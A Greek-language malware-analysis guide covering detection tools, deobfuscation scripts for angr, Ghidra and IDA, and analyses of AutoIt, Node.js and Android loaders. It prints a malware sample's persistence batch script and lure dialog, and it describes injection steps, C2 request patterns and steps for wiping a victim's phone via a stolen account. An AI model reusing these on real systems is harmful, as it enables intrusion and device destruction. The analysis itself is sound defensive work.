# Ανάλυση Κακόβουλου Λογισμικού

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Διαδικτυακές Υπηρεσίες

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Εργαλεία Antivirus και Ανίχνευσης εκτός σύνδεσης

### Yara

#### Εγκατάσταση
```bash
sudo apt-get install -y yara
```
#### Προετοιμάστε τους κανόνες

Χρησιμοποιήστε αυτό το script για να κατεβάσετε και να συγχωνεύσετε όλους τους yara malware κανόνες από github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Δημιουργήστε τον φάκελο _**rules**_ και εκτελέστε το script. Αυτό θα δημιουργήσει ένα αρχείο με όνομα _**malware_rules.yar**_ το οποίο περιέχει όλους τους yara κανόνες για malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Σάρωση
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Έλεγχος για malware και δημιουργία yara rules

Μπορείτε να χρησιμοποιήσετε το εργαλείο [**YaraGen**](https://github.com/Neo23x0/yarGen) για να δημιουργήσετε yara rules από ένα binary. Δείτε αυτούς τους οδηγούς: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Εγκατάσταση
```
sudo apt-get install -y clamav
```
#### Σάρωση
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** ανιχνεύει πιθανώς κακόβουλες **capabilities** σε εκτελέσιμα: PE, ELF, .NET. Έτσι θα βρει πράγματα όπως Att\&ck tactics, ή ύποπτες δυνατότητες όπως:

- έλεγχος για σφάλμα OutputDebugString
- εκτέλεση ως υπηρεσία
- δημιουργία διεργασίας

Κατέβασέ το από το [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC σημαίνει Indicator Of Compromise. Ένα IOC είναι ένα σύνολο **συνθηκών που ταυτοποιούν** κάποιο πιθανώς ανεπιθύμητο λογισμικό ή επιβεβαιωμένο **malware**. Οι Blue Teams χρησιμοποιούν αυτό το είδος ορισμού για να **αναζητήσουν αυτό το είδος κακόβουλων αρχείων** στα **systems** και **networks** τους.\
Η κοινή χρήση αυτών των ορισμών είναι πολύ χρήσιμη, καθώς όταν εντοπίζεται malware σε έναν υπολογιστή και δημιουργείται ένα IOC για αυτό το malware, άλλες Blue Teams μπορούν να το χρησιμοποιήσουν για να εντοπίσουν το malware πιο γρήγορα.

Ένα εργαλείο για να δημιουργήσετε ή να τροποποιήσετε IOCs είναι [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**Redline**](https://www.fireeye.com/services/freeware/redline.html) για να **αναζητήσετε τους ορισμένους IOCs σε μια συσκευή**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) είναι ένας σαρωτής για Simple Indicators of Compromise.\
Η ανίχνευση βασίζεται σε τέσσερις μεθόδους ανίχνευσης:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) είναι ένας σαρωτής malware για Linux που κυκλοφορεί υπό την άδεια GNU GPLv2, ο οποίος έχει σχεδιαστεί γύρω από τις απειλές που αντιμετωπίζονται σε περιβάλλοντα κοινόχρηστης φιλοξενίας. Χρησιμοποιεί δεδομένα απειλών από συστήματα ανίχνευσης εισβολών στο όριο του δικτύου για να εξάγει malware που χρησιμοποιείται ενεργά σε επιθέσεις και να δημιουργεί υπογραφές για ανίχνευση. Επιπλέον, δεδομένα απειλών προέρχονται επίσης από υποβολές χρηστών μέσω της λειτουργίας LMD checkout και από πόρους της κοινότητας malware.

### rkhunter

Εργαλεία όπως [**rkhunter**](http://rkhunter.sourceforge.net) μπορούν να χρησιμοποιηθούν για να ελέγξουν το σύστημα αρχείων για πιθανά **rootkits** και malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) είναι ένα εργαλείο που θα προσπαθήσει να βρει obfuscated strings μέσα σε executables χρησιμοποιώντας διάφορες τεχνικές.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) ελέγχει κάποια βασικά στοιχεία μέσα στο executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) είναι ένα εργαλείο που επιτρέπει να λαμβάνετε πληροφορίες για Windows executables όπως imports, exports, headers, αλλά επίσης θα ελέγξει virus total και θα βρει πιθανές Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) είναι ένα εργαλείο για να ανιχνεύσει αν ένα αρχείο είναι **encrypted** και επίσης να βρει **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) είναι ένα Python script που χρησιμοποιεί μια ποικιλία **statistical methods** για να εντοπίσει **obfuscated** και **encrypted** περιεχόμενο μέσα σε text/script files. Ο προοριζόμενος σκοπός του NeoPI είναι να βοηθήσει στην **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) κάνει ό,τι καλύτερο μπορεί για να εντοπίσει **obfuscated**/**dodgy code** καθώς και αρχεία που χρησιμοποιούν **PHP** functions που συχνά χρησιμοποιούνται σε **malwares**/webshells.

### Apple Binary Signatures

Όταν ελέγχετε κάποιο **malware sample** πρέπει πάντα να **check the signature** του binary καθώς ο **developer** που το υπέγραψε μπορεί να είναι ήδη **related** με **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Τεχνικές Ανίχνευσης

### File Stacking

Αν γνωρίζετε ότι κάποιος φάκελος που περιέχει τα **αρχεία** ενός web server ενημερώθηκε **τελευταία σε κάποια ημερομηνία**, **ελέγξτε** την **ημερομηνία** δημιουργίας και τροποποίησης όλων των **αρχείων** στον **web server** και αν κάποια ημερομηνία είναι **ύποπτη**, ελέγξτε εκείνο το αρχείο.

### Baselines

Αν τα αρχεία ενός φακέλου **δεν έπρεπε να είχαν τροποποιηθεί**, μπορείτε να υπολογίσετε το **hash** των **αρχικών αρχείων** του φακέλου και να τα **συγκρίνετε** με τα **τρέχοντα**. Οτιδήποτε τροποποιήθηκε θα είναι **ύποπτο**.

### Statistical Analysis

Όταν οι πληροφορίες αποθηκεύονται σε logs μπορείτε να **ελέγξετε στατιστικά** όπως πόσες φορές προσπελάστηκε κάθε αρχείο ενός web server — ένα web shell μπορεί να είναι από τα πιο συχνά προσπελασμένα.

---

### Android in-app native telemetry (no root)

Σε Android, μπορείτε να instrument εγγενή κώδικα μέσα στη διεργασία της στοχευμένης εφαρμογής προφορτώνοντας μια μικρή βιβλιοθήκη logger πριν αρχικοποιήσουν άλλες JNI libs. Αυτό δίνει πρώιμη ορατότητα στη συμπεριφορά του native κώδικα χωρίς system-wide hooks ή root. Μια δημοφιλής προσέγγιση είναι SoTap: τοποθετήστε το libsotap.so για το σωστό ABI μέσα στο APK και εισάγετε μια κλήση System.loadLibrary("sotap") νωρίς (π.χ., static initializer ή Application.onCreate), στη συνέχεια συλλέξτε logs από εσωτερικά/εξωτερικά μονοπάτια ή ως fallback το Logcat.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Μερικά Android malware και RASP-protected apps κρύβουν τα ονόματα και τις υπογραφές των JNI μεθόδων αποκωδικοποιώντας τα κατά το runtime πριν καλέσουν το RegisterNatives. Όταν η Frida/ptrace instrumentation τερματίζεται από anti-debug, μπορείτε να ανακτήσετε το plaintext offline εκτελώντας τον in-binary decoder με το angr και στη συνέχεια εισάγοντας τα αποτελέσματα πίσω στο Ghidra ως σχόλια.

Κύρια ιδέα: αντιμετωπίστε τον decoder μέσα στο .so ως callable function, εκτελέστε τον πάνω στα obfuscated byte blobs στο .rodata, και υλοποιήστε (concretize) τα output bytes μέχρι το πρώτο \x00 (C-string terminator). Διατηρήστε το angr και το Ghidra με την ίδια image base για να αποφύγετε mismatches διευθύνσεων.

Workflow overview
- Triage in Ghidra: εντοπίστε τον decoder και το calling convention/arguments του στο JNI_OnLoad και στη ρύθμιση του RegisterNatives.
- Run angr (CPython3) για να εκτελέσετε τον decoder για κάθε στοχευμένο string και να εξαγάγετε τα αποτελέσματα.
- Annotate in Ghidra: αυτόματο σχόλιο των decoded strings σε κάθε call site για γρήγορη ανακατασκευή των JNI.

Ghidra triage (JNI_OnLoad pattern)
- Εφαρμόστε JNI datatypes στο JNI_OnLoad ώστε το Ghidra να αναγνωρίζει τις δομές JNINativeMethod.
- Τυπικό JNINativeMethod σύμφωνα με τα Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Ψάξτε για κλήσεις στο RegisterNatives. Αν η βιβλιοθήκη κατασκευάζει το name/signature με μια τοπική routine (π.χ., FUN_00100e10) που αναφέρεται σε έναν static byte table (π.χ., DAT_00100bf4) και παίρνει παραμέτρους όπως (encoded_ptr, out_buf, length), τότε αυτό είναι ιδανικός στόχος για offline execution.

angr setup (execute the decoder offline)
- Φορτώστε το .so με την ίδια base που χρησιμοποιήθηκε στο Ghidra (παράδειγμα: 0x00100000) και απενεργοποιήστε το auto-loading εξωτερικών libs για να κρατήσετε το state μικρό.

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Σε μεγάλη κλίμακα, δημιουργήστε έναν στατικό χάρτη των call sites προς τα arguments του decoder (encoded_ptr, size). Οι wrappers μπορεί να κρύβουν τα arguments, οπότε μπορείτε να δημιουργήσετε αυτό το mapping χειροκίνητα από τα Ghidra xrefs αν το API recovery παράγει θόρυβο.

<details>
<summary>Μαζική αποκωδικοποίηση πολλαπλών call sites με angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Σχολιάστε σημεία κλήσης στο Ghidra
Επιλογή A: Μόνο Jython για εγγραφή σχολίων (χρησιμοποιήστε προ-υπολογισμένο JSON)
- Εφόσον το angr απαιτεί CPython3, κρατήστε τη deobfuscation και την annotation ξεχωριστές. Πρώτα τρέξτε το angr script παραπάνω για να παράξετε decoded_strings.json. Έπειτα τρέξτε αυτό το Jython GhidraScript για να γράψει PRE_COMMENTs σε κάθε σημείο κλήσης (και να συμπεριλάβει το όνομα της καλούσας συνάρτησης για συμφραζόμενα):

<details>
<summary>Ghidra Jython script για να σχολιάσει αποκωδικοποιημένες συμβολοσειρές JNI</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Επιλογή B: Single CPython script via pyhidra/ghidra_bridge
- Εναλλακτικά, χρησιμοποιήστε pyhidra ή ghidra_bridge για να χειριστείτε το API του Ghidra από την ίδια CPython διεργασία που τρέχει angr. Αυτό επιτρέπει την κλήση της decode_string() και τον άμεσο καθορισμό PRE_COMMENTs χωρίς ενδιάμεσο αρχείο. Η λογική αντανακλά το Jython script: κατασκευάστε έναν χάρτη callsite→function μέσω του ReferenceManager, κάντε decode με angr και ορίστε σχόλια.

Γιατί αυτό λειτουργεί και πότε να το χρησιμοποιήσετε
- Η εκτέλεση εκτός σύνδεσης παρακάμπτει RASP/anti-debug: δεν απαιτείται ptrace ή Frida hooks για την ανάκτηση συμβολοσειρών.
- Η ευθυγράμμιση του base_addr μεταξύ Ghidra και angr (π.χ. 0x00100000) εξασφαλίζει ότι οι διευθύνσεις συναρτήσεων/δεδομένων ταιριάζουν μεταξύ των εργαλείων.
- Επαναλήψιμη συνταγή για decoders: αντιμετωπίστε τον μετασχηματισμό ως καθαρή συνάρτηση, δεσμεύστε ένα output buffer σε νέο state, καλέστε την με (encoded_ptr, out_ptr, len), στη συνέχεια concretize μέσω state.solver.eval και αναλύστε C-strings μέχρι το \x00.

Σημειώσεις και παγίδες
- Σεβαστείτε το ABI/calling convention του στόχου. Το angr.factory.callable επιλέγει ένα με βάση το arch· αν τα ορίσματα φαίνονται μετατοπισμένα, ορίστε ρητά το cc.
- Αν ο decoder αναμένει μηδενισμένους output buffers, αρχικοποιήστε το outbuf με μηδενικά στο state πριν την κλήση.
- Για position-independent Android .so, παρέχετε πάντα base_addr ώστε οι διευθύνσεις στο angr να ταιριάζουν με αυτές που βλέπει το Ghidra.
- Χρησιμοποιήστε το currentProgram.getReferenceManager() για να απαριθμήσετε call-xrefs ακόμη και αν η εφαρμογή τυλίγει τον decoder πίσω από thin stubs.

Για τα βασικά του angr, δείτε: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Αποπαραμόρφωση Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Οι σύγχρονες οικογένειες malware καταχρώνται σε μεγάλο βαθμό την Control-Flow Graph (CFG) obfuscation: αντί για άμεσο jump/call υπολογίζουν τον προορισμό κατά το run-time και εκτελούν `jmp rax` ή `call rax`. Ένας μικρός *dispatcher* (συνήθως εννέα εντολές) καθορίζει τον τελικό στόχο ανάλογα με τα CPU `ZF`/`CF` flags, διασπώντας εντελώς την στατική ανάκτηση του CFG.

Η τεχνική — όπως εμφανίζεται στον SLOW#TEMPEST loader — μπορεί να νικηθεί με ένα workflow τριών βημάτων που βασίζεται μόνο στο IDAPython και τον Unicorn CPU emulator.

### 1. Εντοπίστε κάθε indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Εξαγωγή του dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Εξομοιώστε το δύο φορές με Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Εκτελέστε `run(code,0,0)` και `run(code,1,1)` για να λάβετε τους προορισμούς των κλάδων *false* και *true*.

### 4. Επαναφορά ενός άμεσου jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Μετά το patching, αναγκάστε το IDA να αναλύσει ξανά τη συνάρτηση ώστε το πλήρες CFG και η έξοδος του Hex-Rays να αποκατασταθούν:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Επισήμανση έμμεσων κλήσεων API

Μόλις γίνει γνωστός ο πραγματικός προορισμός κάθε `call rax`, μπορείτε να πείτε στο IDA τι είναι, ώστε οι τύποι παραμέτρων & τα ονόματα μεταβλητών να ανακτηθούν αυτόματα:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Πρακτικά οφέλη

* Επαναφέρει το πραγματικό CFG → decompilation από *10* γραμμές σε χιλιάδες.
* Ενεργοποιεί string-cross-reference & xrefs, καθιστώντας την behaviour reconstruction προφανή.
* Scripts είναι επαναχρησιμοποιήσιμα: τοποθετήστε τα σε οποιονδήποτε loader που προστατεύεται από την ίδια τεχνική.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Αυτό το πρότυπο εισβολής συνδέει ένα υπογεγραμμένο MSI, AutoIt loaders compiled to .a3x, και μια εργασία Task Scheduler που μεταμφιέζεται ως benign app.

### MSI → custom actions → AutoIt orchestrator

Το δέντρο διεργασιών και οι εντολές που εκτελούνται από τις MSI custom actions:

- MsiExec.exe → cmd.exe για να εκτελέσει το install.bat
- WScript.exe για να εμφανίσει έναν παραπλανητικό διάλογο σφάλματος
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (αποθέτει loader, ορίζει persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (δόλωμα χρήστη):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Κύρια τεκμήρια και παραπλάνηση:
- Drops AutoIt3.exe and IoKlTr.au3 to C:\Users\Public\Music
- Copies schtasks.exe to hwpviewer.exe (μασκαρεύεται ως Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" that runs every 1 minute
- Startup LNK seen as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stages modules under %APPDATA%\Google\Browser\ subfolders containing `adb` or `adv` and starts them via autoit.vbs/install.bat helpers

Συμβουλές αρχικής εγκληματολογικής διερεύνησης:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Look for renamed copies of schtasks.exe co-located with Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Common paths: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Συσχέτιση δημιουργίας διεργασιών: AutoIt3.exe spawning legitimate Windows binaries (e.g., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- Τα AutoIt modules μεταγλωττίζονται με `#AutoIt3Wrapper_Outfile_type=a3x` και αποκρυπτογραφούν ενσωματωμένα payloads πριν τα inject σε benign processes.
- Παρατηρούμενες οικογένειες: QuasarRAT (injected into hncfinder.exe) and RftRAT/RFTServer (injected into cleanmgr.exe), καθώς και RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Πρότυπο αποκρυπτογράφησης: παράγει ένα AES key μέσω HMAC, αποκρυπτογραφεί το ενσωματωμένο blob, και στη συνέχεια inject το plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (ανασταλμένο) του target host (π.χ., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory με το αποκρυπτογραφημένο module/shellcode
- CreateRemoteThread ή QueueUserAPC για την εκτέλεση του payload

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe που εκκινεί system utilities
- Αρχεία με `.a3x` επεκτάσεις ή AutoIt script runners σε διαδρομές όπου ο χρήστης/δημόσιος χώρος επιτρέπει εγγραφή
- Suspicious scheduled tasks που εκτελούν AutoIt3.exe ή binaries μη υπογεγραμμένα από Microsoft, με minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Κατά τη διάρκεια της εισβολής στα Windows, operators χρησιμοποίησαν κλεμμένα διαπιστευτήρια Google για να σβήνουν επανειλημμένα τις Android συσκευές του θύματος, καταστέλλοντας τις ειδοποιήσεις ενώ επέκτειναν την πρόσβαση μέσω του desktop messenger όπου το θύμα ήταν συνδεδεμένο.

Operator steps (from a logged-in browser session):
- Ελέγξτε Google Account → Security → Your devices; ακολουθήστε Find My Phone → Find Hub (https://www.google.com/android/find)
- Επιλέξτε συσκευή → επανεισάγετε τον Google password → εκτελέστε "Erase device" (factory reset); επαναλάβετε για να καθυστερήσετε την ανάκτηση
- Προαιρετικά: διαγράψτε alert e-mails στο συνδεδεμένο mailbox (π.χ., Naver) για να αποκρύψετε ειδοποιήσεις ασφαλείας

## Tracing heavily obfuscated Node.js loaders

Οι επιτιθέμενοι όλο και πιο συχνά ενσωματώνουν JavaScript loaders μέσα σε standalone Windows binaries που έχουν μεταγλωττιστεί με [`nexe`](https://github.com/nexe/nexe), έτσι το runtime περιλαμβάνεται μαζί με το script. Το προκύπτον PE συχνά έχει μέγεθος 60–90 MB και εκτελείται ακόμη κι αν το Node.js δεν είναι εγκατεστημένο. Κατά την αξιολόγηση:

- Χρησιμοποιήστε [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) για να εξαγάγετε το ενσωματωμένο JavaScript από το PE και να το δώσετε σε τοπικά εργαλεία για static diffing.
- Αναμένεται ένα disk-based mutex στο `%TEMP%` (ο GachiLoader ρίχνει ένα τυχαίο `<name>.lock` αρχείο που λήγει μετά από ~5 λεπτά). Η αντιγραφή του αρχείου στο sandbox πριν από την εκτέλεση σας επιτρέπει να παραλείψετε επαναλαμβανόμενα στάδια ενώ εξακολουθείτε να βλέπετε τα επόμενα payloads.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) κάνει hook στα core modules μέσα σε οποιαδήποτε Node.js process, σας επιτρέπει να spoofάρετε anti-VM probes, και διατηρεί κάθε artifact που γράφει το δείγμα. Εκκινήστε obfuscated scripts μέσω του tracer για να διατηρήσετε την analyst-controlled instrumentation στο call stack:
```powershell
node -r .\tracer.js main.js
```
Βασικές επιλογές ρύθμισης μέσα στο `tracer.js` σάς επιτρέπουν να:

- Καταγράφουν δραστηριότητα filesystem, child-process και HTTP (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Κάθε αρχείο που απορρίπτεται — όπως το `kidkadi.node` — αντιγράφεται στον working directory πριν το malware το διαγράψει.
- Παρακάμπτουν fingerprints περιβάλλοντος επιστρέφοντας ρεαλιστικούς αριθμούς RAM/CPU, πλαστογραφώντας το output του `tasklist` και αλλοιώνοντας τις απαντήσεις του PowerShell/WMI. Αυτό παρακάμπτει loaders που απαιτούν ≥4 GB RAM, ≥2 cores, και ελέγχουν ονόματα χρηστών (`mashinesssss`, `wdagutilityaccount`, κ.λπ.), hostnames (`desktop-vrsqlag`, `server1` …) και ονόματα διεργασιών (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Αδρανοποιούν ελέγχους υλικού WMI όπως `Get-WmiObject Win32_DiskDrive` (αναζητώντας `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (αποκλείοντας “VirtualBox Graphics Adapter”, “Hyper-V Video”, κ.λπ.) και μετρήσεις `Win32_PortConnector`. Όταν αυτές οι ανιχνεύσεις αναφέρουν “πραγματικό” hardware, τα sandboxes δεν μπλοκάρονται πλέον στην άπειρη βρόχο των αβλαβών κλήσεων `Invoke-WebRequest` προς `linkedin.com`, `grok.com`, `whatsapp.com` και παρόμοια domains που χρησιμοποιεί το GachiLoader για να σπαταλά χρόνο ανάλυσης.

### Καταγραφή ελεγχόμενης C2 κίνησης αυτόματα

Τα network hooks του tracer αποκαλύπτουν πολυστρωματική C2 πιστοποίηση χωρίς να χρειάζεται να αναστραφεί η JavaScript obfuscation. Στην παρατηρηθείσα καμπάνια ο loader:

1. Κάνει POST telemetry του host στο `/log` σε κάθε hard-coded C2.
2. Εκτελεί `GET /richfamily/<per-sample key>` με `X-Secret: gachifamily` για να πάρει ένα Base64-encoded payload URL.
3. Εκτελεί τελικό `GET` σε εκείνο το URL με μακρύ per-sample `X-Secret` header· αν λείπει επιστρέφεται `403 Forbidden`.

Επειδή ο tracer καταγράφει πλήρως τα requests (headers, bodies, destinations), μπορείτε να επαναπαίξετε την ίδια κίνηση για να τραβήξετε payloads, να dumpάρετε Themida/VMProtect shells στη μνήμη, και να εξάγετε δεδομένα διαμόρφωσης Rhadamanthys σε κλίμακα.

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf: Tradecraft του Android Botnet

### APK loader & native ELF execution on TV boxes
- Κακόβουλα APKs όπως το `com.n2.systemservice06*` περιέχουν ένα statically linked ARM ELF μέσα στο `res/raw` (π.χ. `R.raw.libniggakernel`). Ένας `BOOT_COMPLETED` receiver τρέχει κατά την εκκίνηση, εξάγει το raw resource στο app sandbox (π.χ. `/data/data/<pkg>/niggakernel`), το κάνει εκτελέσιμο και το καλεί με `su`.
- Πολλές Android TV boxes/tablets συνοδεύονται από pre-rooted images ή world-writable `su`, οπότε ο loader φορτώνει αξιόπιστα το ELF με UID 0 ακόμα και χωρίς αλυσίδα exploit. Η persistence έρχεται «δωρεάν» επειδή ο receiver ξαναξεκινάει μετά από κάθε reboot ή επανεκκίνηση της εφαρμογής.
